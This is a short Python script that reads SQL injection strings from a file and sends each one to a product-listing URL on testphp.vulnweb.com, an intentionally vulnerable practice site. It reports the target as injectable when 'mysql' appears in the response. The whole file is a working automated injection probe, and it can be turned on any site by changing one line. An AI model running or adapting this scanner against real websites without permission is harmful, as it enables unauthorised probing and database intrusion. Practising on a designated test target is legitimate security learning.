import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat="

mysql_attacks = []

# open file and read the content in a list
with open('MSSQL.txt', 'r') as filehandle:
    for line in filehandle:
        attack = line[:-1]
        mysql_attacks.append(attack)

for attack in mysql_attacks:
	print("Testing... "+ domain + attack)
	response = requests.get(domain + attack)
	if "mysql" in response.text.lower(): 
		print("Injectable MySQL detected")
		print("Attack string: "+attack)
